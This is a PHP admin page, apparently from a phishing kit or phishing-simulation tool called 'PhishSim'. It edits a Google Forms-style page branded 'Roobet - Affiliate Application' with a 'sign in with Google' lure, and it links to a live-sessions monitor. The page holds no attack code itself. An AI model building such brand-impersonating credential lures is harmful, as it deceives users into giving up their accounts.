<?php
require_once('../shade/core/config.php');
require_once('../shade/core/page_assets.php');
require_once(__DIR__ . '/includes/assets.php');
if (empty($_SESSION['admin_pass']) || $_SESSION['admin_pass'] != ADMIN_PASS) {
    header('Location: ' . admin_asset('login'));
    exit;
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PhishSim — Form Düzenle</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <link rel="stylesheet" href="<?= admin_asset_esc('assets/css/admin.css') ?>?v=<?= filemtime(__DIR__ . '/assets/css/admin.css') ?>">
</head>
<body class="page-form-editor">
  <div class="app-shell">
    <aside class="sidebar">
      <div class="sidebar-brand">
        <div class="brand-icon"><i class="fas fa-shield-alt"></i></div>
        <div>
          <strong>PhishSim</strong>
          <span>Operasyon Merkezi</span>
        </div>
      </div>

      <nav class="sidebar-nav">
        <a href="<?= admin_asset_esc('') ?>" class="side-link"><i class="fas fa-satellite-dish"></i> Canlı Oturumlar</a>
        <a href="<?= admin_asset_esc('form') ?>" class="side-link active"><i class="fas fa-edit"></i> Form Düzenle</a>
      </nav>
    </aside>

    <div class="main-area">
      <header class="topbar">
        <div class="topbar-left">
          <h1>Form Düzenle</h1>
          <p>Ana sayfa formunu buradan yönet</p>
        </div>
        <div class="topbar-right">
          <a href="<?= page_url_esc('viewform') ?>" class="btn-preview" target="_blank" rel="noopener">
            <i class="fas fa-external-link-alt"></i> Önizle
          </a>
          <button type="button" class="btn-save-form" id="save-form-btn">
            <i class="fas fa-save"></i> Kaydet
          </button>
          <a href="<?= admin_asset_esc('logout') ?>" class="btn-logout" title="Çıkış">
            <i class="fas fa-sign-out-alt"></i>
          </a>
        </div>
      </header>

      <div class="form-editor-layout">
        <section class="editor-panel">
          <h2 class="panel-title">Üst Alan</h2>
          <div class="editor-field">
            <label for="form-title">Form başlığı</label>
            <input type="text" id="form-title" class="editor-input" placeholder="Roobet - Affiliate Application">
          </div>
          <div class="editor-field">
            <label for="form-signin-text">Giriş metni</label>
            <input type="text" id="form-signin-text" class="editor-input" placeholder="To save your progress, please">
          </div>
          <div class="editor-field">
            <label for="form-signin-link">Giriş link metni</label>
            <input type="text" id="form-signin-link" class="editor-input" placeholder="sign in with Google">
          </div>
          <div class="editor-field">
            <label for="form-required-note">Zorunlu alan notu</label>
            <input type="text" id="form-required-note" class="editor-input" placeholder="* Indicates required question">
          </div>
          <div class="editor-row editor-row-settings">
            <div class="editor-field editor-field-color">
              <label for="form-accent">Tema rengi</label>
              <input type="color" id="form-accent" class="editor-color" value="#673ab7">
            </div>
            <div class="editor-field">
              <label for="form-submit">Gönder butonu</label>
              <input type="text" id="form-submit" class="editor-input" placeholder="Submit">
            </div>
            <div class="editor-field">
              <label for="form-clear">Temizle butonu</label>
              <input type="text" id="form-clear" class="editor-input" placeholder="Clear form">
            </div>
          </div>
        </section>

        <section class="editor-panel editor-panel-questions">
          <div class="panel-head">
            <h2 class="panel-title">Sorular</h2>
            <button type="button" class="btn-add-question" id="add-question-btn">
              <i class="fas fa-plus"></i> Soru Ekle
            </button>
          </div>
          <div id="questions-list" class="questions-list"></div>
        </section>
      </div>
    </div>
  </div>

  <div id="toast-container"></div>

  <script>window.ADMIN_API = <?= json_encode(project_asset('shade/core/ajax.php')) ?>;</script>
  <script src="<?= admin_asset_esc('assets/js/jquery.min.js') ?>"></script>
  <script src="<?= admin_asset_esc('assets/js/form-editor.js') ?>?v=<?= filemtime(__DIR__ . '/assets/js/form-editor.js') ?>"></script>
</body>
</html>
